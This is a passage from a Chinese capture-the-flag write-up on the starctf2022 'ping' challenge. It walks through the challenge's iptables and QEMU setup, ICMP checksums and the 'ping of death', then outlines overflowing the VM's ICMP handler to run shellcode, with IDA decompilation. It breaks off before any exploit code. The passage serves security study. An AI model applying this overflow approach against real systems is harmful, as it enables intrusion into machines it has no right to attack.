class="line">sudo ifconfig tap100 10.10.10.2/24</span><br><span class="line"></span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -A INPUT -p icmp --icmp-type echo-request -j REJECT </span><br><span class="line">sudo iptables -t nat -I PREROUTING -p icmp -d 0.0.0.0/0 -j DNAT --to-destination 10.10.10.10</span><br><span class="line">sudo iptables -t nat -I POSTROUTING -p icmp -d 10.10.10.10 -j SNAT --to-source 10.10.10.2</span><br><span class="line">echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward </span><br><span class="line"></span><br><span class="line">while true;</span><br><span class="line">do</span><br><span class="line">    sudo rm -f /tmp/flag.txt</span><br><span class="line">    sudo cp flag.txt /tmp</span><br><span class="line">    sudo chmod 644 /tmp/flag.txt</span><br><span class="line">    sudo chown nobody /tmp/flag.txt</span><br><span class="line">    sudo setpriv --reuid=nobody --regid=netdev --init-groups \</span><br><span class="line">        timeout 60 \</span><br><span class="line">        qemu-system-i386 -cdrom kernel.iso \</span><br><span class="line">        -hda /tmp/flag.txt \</span><br><span class="line">        -netdev tap,id=n1,ifname=tap100,script=no,downscript=no \</span><br><span class="line">        -device virtio-net-pci,netdev=n1,mac=01:02:03:04:05:06 \</span><br><span class="line">        -m 64M -display none \</span><br><span class="line">        -monitor /dev/null</span><br><span class="line">    sleep 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p><strong>配置虚拟网卡</strong></p>
<p>tunctl 允许主机系统管理员预先配置一个 TUN/TAP 设备以供特定用户使用</p>
<ul>
<li>tunctl -t device-name：指定要创建的 tap/tun 设备名 </li>
<li>tunctl -u user：为用户 user 创建一个 tap 接口</li>
</ul>
<p>ifconfig 可被用于设置虚拟网卡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig tap100 <span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  starctf2022_ping ifconfig -a</span><br><span class="line">......</span><br><span class="line">tap100: flags=<span class="number">4099</span>&lt;UP,BROADCAST,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  netmask <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span>  broadcast <span class="number">127.255</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::<span class="number">4</span>ce7:<span class="number">6f</span>f:fec5:<span class="number">2</span>a61  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">4</span>e:e7:<span class="number">06</span>:c5:<span class="number">2</span>a:<span class="number">61</span>  txqueuelen <span class="number">1000</span>  (以太网)</span><br><span class="line">        RX packets <span class="number">0</span>  bytes <span class="number">0</span> (<span class="number">0.0</span> B)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">45</span>  bytes <span class="number">5804</span> (<span class="number">5.8</span> KB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">4</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zhaihaifei/article/details/23168621">tunctl添加虚拟网卡TUN/TAP与brctl添加网桥</a> </p>
<p><strong>配置 Linux 防火墙</strong></p>
<p>在早期的 Linux 系统中，默认使用的是 iptables 配置防火墙（iptables 是 Linux 防火墙工作在用户空间的管理工具，是 netfilter/iptables IP 信息包过滤系统的一部分，用来设置、维护和检查 Linux 内核的 IP 数据包过滤规则）</p>
<ul>
<li>iptables 是基于内核的防火墙，功能非常强大</li>
<li>所有规则配置后，立即生效，不需要重启服务</li>
</ul>
<p>iptables 的结构是由表（tables）组成，而 tables 是由链组成，链又是由具体的规则组成：</p>
<p>三张表：</p>
<ul>
<li><p><strong><code>filter</code></strong>，负责过滤数据包，包括的规则链有：<code>input</code>，<code>output</code> 和 <code>forward</code> </p>
</li>
<li><p><strong><code>nat</code></strong>，用于网络地址转换（IP、端口），包括的规则链有：<code>prerouting</code>，<code>postrouting</code> 和 <code>output</code> </p>
</li>
<li><p><strong><code>mangle</code></strong>，主要应用在修改数据包、流量整形、给数据包打标识，默认的规则链有：<code>input</code>，<code>output</code>、 <code>forward</code>，<code>postrouting</code>，<code>prerouting</code> </p>
</li>
</ul>
<p>五条链：</p>
<ul>
<li><p><strong><code>input</code></strong>，匹配目标IP是本机的数据包</p>
</li>
<li><p><strong><code>output</code></strong>，出口数据包 ， 一般不在此链上做配置</p>
</li>
<li><p><strong><code>forward</code></strong>，匹配流经本机的数据包，和流量转发有关</p>
</li>
<li><p><strong><code>prerouting</code></strong>，修改目的地址，用来做 DNAT（如：把内网中的 80 端口映射到互联网端口）</p>
</li>
<li><p><strong><code>postrouting</code></strong>，修改源地址，用来做 SNAT（如：局域网共享一个公网IP接入 Internet）</p>
</li>
</ul>
<p>因此我们在编写 iptables 规则时，要先指定表，再指定链，tables 的作用是区分不同功能的规则，并且存储这些规则：</p>
<p><img src="/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/1657783449606.png" alt="1657783449606">  </p>
<p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1632776#:~:text=1、什么是iptables？. iptables 是 Linux 防火墙工作在用户空间的管理工具，是 netfilter%2Fiptables,IP 信息包过滤系统是一部分，用来设置、维护和检查 Linux 内核的 IP 数据包过滤规则。.">iptables系列教程（一）iptables入门篇</a> </p>
<p><strong>iptables 基本概念</strong></p>
<ul>
<li>匹配（match）：符合指定的条件，比如指定的 IP 地址和端口</li>
<li>丢弃（drop）：当一个包到达时，简单地丢弃，不做其它任何处理</li>
<li>接受（accept）：和丢弃相反，接受这个包，让这个包通过</li>
<li>拒绝（reject）：和丢弃相似，但它还会向发送这个包的源主机发送错误消息。这个错误消息可以指定，也可以自动产生</li>
<li>目标（target）：指定的动作，说明如何处理一个包，比如：丢弃，接受，或拒绝</li>
<li>跳转（jump）：和目标类似，不过它指定的不是一个具体的动作，而是另一个链，表示要跳转到那个链上</li>
<li>规则（rule）：一个或多个匹配及其对应的目标</li>
<li>策略（policy）：我们在这里提到的策略是指，对于 iptables 中某条链，当所有规则都匹配不成功时其默认的处理动作</li>
<li>连接跟踪（connection track）：又称为动态过滤，可以根据指定连接的状态进行一些适当的过滤，是一个很强大的功能，但同时也比较消耗内存资源</li>
</ul>
<p><strong>iptables 处理数据包流程</strong></p>
<p>当一个数据包进入网卡时，它首先进入 <code>prerouting</code> 链，内核根据数据包目的 IP 判断是否需要转送出去</p>
<ul>
<li>如果数据包就是进入本机的，它就会沿着图向左移动，到达 <code>input</code> 链（数据包到了 <code>input</code> 链后，任何进程都会收到它）</li>
<li>如果数据包是要转发出去的，且内核允许转发，数据包就会向右移动，经过 <code>forward</code> 链，然后到达 <code>postrouting</code> 链输出</li>
</ul>
<p>本机上运行的程序可以发送数据包，这些数据包会经过 <code>output</code> 链，然后到达 <code>postrouting</code> 链输出</p>
<ul>
<li>进入本机的数据包经过 <code>input</code> 链后，就会进行一次 Routing Decision（路由判断，路由决策）</li>
<li>然后发送数据包进入 <code>output</code> 链，最后进入 <code>postrouting</code> 链进行输出</li>
</ul>
<p><img src="/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/20141022142620839.png" alt="20141022142620839"> </p>
<p><strong>iptables 的使用</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -P [chain] [target]</span><br></pre></td></tr></table></figure>
<ul>
<li>-P（策略，policy）：为指定的链 chain 设置策略 target（注意，只有内置的链才允许有策略，用户自定义的是不允许的）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A [chain] -p [proto] --icmp-type echo-request -j [target]</span><br></pre></td></tr></table></figure>
<ul>
<li>-A（附加，append）：在指定链 chain 的末尾插入指定的规则，这条规则最后才会被执行（规则是由后面的匹配来指定）</li>
<li>-p（协议，protocol）：指定使用的协议为 proto，其中 proto 必须为 tcp udp icmp 或者 all ，或者表示某个协议的数字（如果 proto 前面有“!”，表示对其取反）</li>
<li>-j（跳转，jump）：指定目标，即满足某条件时该执行什么样的动作，target 可以是内置的目标（比如：ACCEPT），也可以是用户自定义的链</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t [table] -I [chain] [rulenum] -p [proto] -d [address]/[mask] -j DNAT --to-destination 10.10.10.10</span><br></pre></td></tr></table></figure>
<ul>
<li>-t（表，table）：对指定的表 table 进行操作，table 必须是 raw， nat，filter，mangle 中的一个（如果不指定此选项，默认的是 filter 表）</li>
<li>-I（插入，insert）：在链 chain 中的指定位置插入一条或多条规则（如果指定的规则号是“1”，则在链的头部插入，如果没有指定规则号，其默认值也是“1”）</li>
<li>-d（目的，destination）：把指定的一个 [address]/[mask] 一组地址作为目的地址，按此规则进行过滤</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/skc361/article/details/20481521">iptables的基本概念和数据包流程图</a></p>
<p><strong>ICMP 协议及其类型字段</strong></p>
<p>ICMP 协议是一个网络层协议，一个新搭建好的网络，往往需要先进行一个简单的测试（ping 测试），来验证网络是否畅通，但是IP协议并不提供可靠传输（如果丢包了，IP协议并不能通知传输层是否丢包以及丢包的原因），所以我们就需要一种协议来完成这样的功能（ICMP 协议）</p>
<p>ping 和 ICMP 的关系：</p>
<ul>
<li>ping 是一个工具，ICMP 是一个网络层协议</li>
<li>ping 工具的原理是 ICMP 协议，即发送 ICMP echo 报文，返回 ICMP reply 报文</li>
<li>所以 ICMP 的 echo 包也简称为 ping 包，ICMP 的 reply 的包也可以称之为 ping 的回包</li>
</ul>
<p>ICMP 协议的功能主要有：</p>
<ul>
<li>确认IP包是否成功到达目标地址</li>
<li>通知在发送过程中IP包被丢弃的原因</li>
</ul>
<p>ICMP Echo Request/Reply 报文格式如下图所示：</p>
<p><img src="/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/1658225141822.png" alt="1658225141822"> </p>
<ul>
<li>重点看下最后一个 ICMP 报文</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>字段</th>
<th style="text-align:left">长度</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>Type</td>
<td style="text-align:left">1字节</td>
<td>消息类型：0-回显应答报文，8-请求回显报文</td>
</tr>
<tr>
<td>Code</td>
<td style="text-align:left">1字节</td>
<td>消息代码：此处值为0</td>
</tr>
<tr>
<td>Checksum</td>
<td style="text-align:left">2字节</td>
<td>检验和：使用和IP相同的加法校验和算法，但是ICMP校验和仅覆盖ICMP报文</td>
</tr>
<tr>
<td>Identifier</td>
<td style="text-align:left">2字节</td>
<td>标识符：发送端标示此发送的报文</td>
</tr>
<tr>
<td>Sequence Number</td>
<td style="text-align:left">2字节</td>
<td>序列号：发送端发送的报文的顺序号，每发送一次顺序号就加1</td>
</tr>
<tr>
<td>Data</td>
<td style="text-align:left">可变</td>
<td>选项数据：是一个可变长的字段，其中包含要返回给发送者的数据，回显应答通常返回与所收到的数据完全相同的数据</td>
</tr>
</tbody>
</table>
</div>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/nankai0912678/article/details/106065895">IP报头的协议类型字段取值</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhenyi2000/article/details/79795095">ICMP类型字段(Type)以及代码字段(Code)含义汇总</a></li>
<li><a target="_blank" rel="noopener" href="https://www.wlgly.net/post-89.html">ICMP Echo Request/Reply消息格式 - 网管博客</a> </li>
</ul>
<p><strong>计算校验和</strong></p>
<p>数据校验是为保证数据的完整性，用一种指定的算法对原始数据计算出的一个校验值，接收方用同样的算法计算一次校验值，如果和随数据提供的校验值一样，说明数据是完整的，保证数据的完整性和准确性</p>
<ul>
<li>IP Header 中的 checksum：只校验IP首部，不校验数据部分</li>
<li>ICMP Header 中的 checksum：校验ICMP首部和数据部分</li>
</ul>
<p>计算过程如下：</p>
<ul>
<li>把校验和字段设置为“0”</li>
<li>把需要校验的数据看成以16位为单位的数字组成，依次进行二进制反码求和</li>
<li>把得到的结果存入校验和字段中</li>
</ul>
<p>案例：</p>
<p><img src="/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/1658226065509.png" alt="1658226065509">   </p>
<p>ICMP Echo Request：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08</span> <span class="number">00</span> <span class="number">72</span> <span class="number">7</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> </span><br><span class="line"><span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> </span><br><span class="line">hex(<span class="number">0x0800</span> + <span class="number">0x0000</span> + <span class="number">0x0000</span> + <span class="number">0x0000</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span>) = <span class="number">0x18d84</span></span><br><span class="line">hex(<span class="number">0x1</span> + <span class="number">0x8d84</span>) = <span class="number">0x8d85</span></span><br><span class="line">hex(~<span class="number">0x8d85</span> &amp; <span class="number">0xffff</span>) = <span class="number">0x727a</span></span><br><span class="line"><span class="number">08</span> <span class="number">00</span> <span class="number">72</span> <span class="number">7</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>
<p>ICMP Echo Reply：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">7</span>a <span class="number">7</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> </span><br><span class="line">hex(<span class="number">0x0000</span> + <span class="number">0x0000</span> + <span class="number">0x0000</span> + <span class="number">0x0000</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span>) = <span class="number">0x18584</span></span><br><span class="line">hex(<span class="number">0x1</span> + <span class="number">0x8584</span>) = <span class="number">0x8585</span></span><br><span class="line">hex(~<span class="number">0x8d85</span> &amp; <span class="number">0xffff</span>) = <span class="number">0x7a7a</span></span><br><span class="line"><span class="number">08</span> <span class="number">00</span> <span class="number">7</span>a <span class="number">7</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>
<ul>
<li>PS：即使不计算效验和也可以拿到 ping 回包</li>
</ul>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhj082/article/details/80518322">如何计算icmp校验和</a></li>
<li><a target="_blank" rel="noopener" href="http://yaxin-cn.github.io/Python/icmp-packet-checksum-with-python.html">icmp包检验和计算方法及python实现</a></li>
</ul>
<p><strong>理解 run.sh 中的信息</strong></p>
<p>生成一个 tap100 虚拟网卡，ip为10.10.10.2：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap100 -u nobody</span><br><span class="line">sudo ifconfig tap100 10.10.10.2/24</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tap100: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span>  netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  broadcast <span class="number">10.10</span><span class="number">.10</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::<span class="number">6</span>c7a:<span class="number">64f</span>f:fe7a:<span class="number">4b</span>d3  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">6</span>e:<span class="number">7</span>a:<span class="number">64</span>:<span class="number">7</span>a:<span class="number">4b</span>:d3  txqueuelen <span class="number">1000</span>  (以太网)</span><br><span class="line">        RX packets <span class="number">0</span>  bytes <span class="number">0</span> (<span class="number">0.0</span> B)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">136</span>  bytes <span class="number">15443</span> (<span class="number">15.4</span> KB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>对 Linux 防火墙进行设置：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -A INPUT -p icmp --icmp-type echo-request -j REJECT </span><br><span class="line">sudo iptables -t nat -I PREROUTING -p icmp -d 0.0.0.0/0 -j DNAT --to-destination 10.10.10.10</span><br><span class="line">sudo iptables -t nat -I POSTROUTING -p icmp -d 10.10.10.10 -j SNAT --to-source 10.10.10.2</span><br></pre></td></tr></table></figure>
<ul>
<li><p>在 filter 表中：</p>
<ul>
<li>开启转发（不加-t参数默认表）</li>
<li>拒绝 ICMP echo-request（Ping请求）的接受</li>
</ul>
</li>
<li><p>在 nat 表中：</p>
<ul>
<li>把所有将要经过本机路由（预路由）的 ICMP 报文的目标IP全部换成 10.10.10.10（也就是说，只有 10.10.10.10 才能 ping 进虚拟机）</li>
<li>处理好回包路径，将源IP地址均设置为 tap100 网卡的地址</li>
</ul>
</li>
</ul>
<p>开启IP转发：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux 系统默认是禁止数据包转发的</li>
<li>所谓转发即当主机拥有多于一块的网卡时，其中一块收到数据包时，根据数据包的目的IP地址将包发往本机另一网卡，该网卡根据路由表继续发送数据包</li>
</ul>
<p>设置 flag 权限：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -f /tmp/flag.txt</span><br><span class="line">sudo cp flag.txt /tmp</span><br><span class="line">sudo chmod 644 /tmp/flag.txt</span><br><span class="line">sudo chown nobody /tmp/flag.txt</span><br></pre></td></tr></table></figure>
<p>利用 setpriv 设置虚拟机的权限，并且启动虚拟机：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo setpriv --reuid=nobody --regid=netdev --init-groups \</span><br><span class="line">    timeout 60 \</span><br><span class="line">    qemu-system-i386 -cdrom kernel.iso \</span><br><span class="line">    -hda /tmp/flag.txt \</span><br><span class="line">    -netdev tap,id=n1,ifname=tap100,script=no,downscript=no \</span><br><span class="line">    -device virtio-net-pci,netdev=n1,mac=01:02:03:04:05:06 \</span><br><span class="line">    -m 64M -display none \</span><br><span class="line">    -monitor /dev/null</span><br></pre></td></tr></table></figure>
<ul>
<li>QEMU 模拟运行的 x86 简易裸机系统（和目标的交互方式只有 ping）</li>
<li>PS：-display none，不显示 qemu 界面</li>
</ul>
<p>为了调试虚拟机，需要写一个 gdb.sh：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap100 -u nobody</span><br><span class="line">sudo ifconfig tap100 10.10.10.2/24</span><br><span class="line"></span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -A INPUT -p icmp --icmp-type echo-request -j REJECT</span><br><span class="line">sudo iptables -t nat -I PREROUTING -p icmp -d 0.0.0.0/0 -j DNAT --to-destination 10.10.10.10</span><br><span class="line">sudo iptables -t nat -I POSTROUTING -p icmp -d 10.10.10.10 -j SNAT --to-source 10.10.10.2</span><br><span class="line">echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward</span><br><span class="line"></span><br><span class="line">while true;</span><br><span class="line">do</span><br><span class="line">    sudo rm -f /tmp/flag.txt</span><br><span class="line">    sudo cp flag.txt /tmp</span><br><span class="line">    sudo chmod 644 /tmp/flag.txt</span><br><span class="line">    sudo chown nobody /tmp/flag.txt</span><br><span class="line">    qemu-system-i386 -cdrom kernel.iso \</span><br><span class="line">        -hda /tmp/flag.txt \</span><br><span class="line">        -netdev tap,id=n1,ifname=tap100,script=no,downscript=no \</span><br><span class="line">        -device virtio-net-pci,netdev=n1,mac=01:02:03:04:05:06 \</span><br><span class="line">        -m 64M -nographic \</span><br><span class="line">        -s -S \</span><br><span class="line">        -monitor /dev/null</span><br><span class="line">    sleep 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<ul>
<li>前面和 run.sh 一模一样，后面加上 <code>-s -S</code> 方便调试</li>
<li><code>-display none</code>（不显示 qemu）要改为 <code>-nographic</code>（关闭图像界面），不然 gdb 连接会时常断开</li>
</ul>
<p><strong>死亡之 ping</strong></p>
<p>最简单的基于IP的攻击可能要数著名的死亡之 ping，这种攻击主要是由于单个包的长度超过了IP协议规范所规定的包长度</p>
<p>死亡之 ping 的工作原理：</p>
<ul>
<li>首先是因为以太网长度有限，IP包片段被分片，当一个IP包的长度超过以太网帧的最大尺寸（以太网头部和尾部除外）时，包就会被分片，作为多个帧来发送，接收端的机器提取各个分片，并重组为一个完整的IP包，在正常情况下，IP头包含整个IP包的长度，当一个IP包被分片以后，头只包含各个分片的长度，分片并不包含整个IP包的长度信息，因此IP包一旦被分片，重组后的整个IP包的总长度只有在所在分片都接受完毕之后才能确定</li>
<li>在IP协议规范中规定了一个IP包的最大尺寸，包的重组代码所分配的内存区域也不会超过这个最大尺寸，这样，超大的包一旦出现，包当中的额外数据就会被写入其他正常区域，是一种典型的缓存溢出（Buffer Overflow）攻击</li>
<li>由于使用 ping 工具很容易完成这种攻击，以至于它也成了这种攻击的首选武器，预防死亡之 ping 的最好方法是对操作系统打补丁，使内核将不再对超过规定长度的包进行重组</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://www.joshua317.com/article/50">简单的Dos攻击-死亡之Ping</a></p>
<p><strong>入侵思路</strong></p>
<p>漏洞点就是“死亡之 ping”，icmp 包的数据过长引发的栈溢出，现在问题的关键就是找到处理 icmp 包的系统函数，然后分析其栈帧，看看能不能劫持程序执行 shellcode</p>
<p>IDA 分析如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_10000C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_1089E7(&amp;dword_10B000, <span class="number">0</span>, (<span class="keyword">char</span> *)&amp;dword_10C0D0 - (<span class="keyword">char</span> *)&amp;dword_10B000);</span><br><span class="line">  sub_10899B();</span><br><span class="line">  sub_106C4A();</span><br><span class="line">  sub_107AB9(&amp;unk_200000, dword_100000);</span><br><span class="line">  sub_107F34(&amp;unk_300000);</span><br><span class="line">  sub_1076D1();</span><br><span class="line">  sub_103287();</span><br><span class="line">  sub_103404();</span><br><span class="line">  sub_10063B();</span><br><span class="line">  sub_102D25();</span><br><span class="line">  sub_1025A8();</span><br><span class="line">  sub_1029D4();</span><br><span class="line">  sub_107888();</span><br><span class="line">  sub_1034AB();</span><br><span class="line">  dword_10C0D0 = sub_107E9E(<span class="number">1024</span>, <span class="number">0x10000</span>);</span><br><span class="line">  sub_103910(<span class="number">0</span>);</span><br><span class="line">  sub_104536(<span class="number">0</span>, <span class="number">1u</span>, <span class="number">0</span>, dword_10C0D0);</span><br><span class="line">  sub_1083B7(<span class="string">&quot;load flag:%s\n&quot;</span>);                 <span class="comment">// printf</span></span><br><span class="line">  sub_1083B7(<span class="string">&quot;ping me...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( unk_10C264 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_101F9F((<span class="keyword">int</span>)&amp;unk_10C8A0 + <span class="number">12</span>, unk_10C264 - <span class="number">12</span>, (<span class="keyword">int</span>)&amp;unk_10C280, &amp;dword_10C878);</span><br><span class="line">    unk_10C264 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_10C878 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_101F05((<span class="keyword">int</span>)&amp;unk_10C280, dword_10C878);</span><br><span class="line">    dword_10C878 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就是这个题目最恶心的地方了，所有函数都没有符号（包括库函数），要理解程序必须先把库函数找出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- sub_108AA9：<span class="built_in">memcpy</span></span><br><span class="line">- sub_1089E7：<span class="built_in">memset</span></span><br><span class="line">- sub_1083B7：<span class="built_in">printf</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里推荐从高地址到低地址挨着看，找到 memcpy 就差不多了</li>
</ul>
<p>在调试的同时发送测试数据：</p>
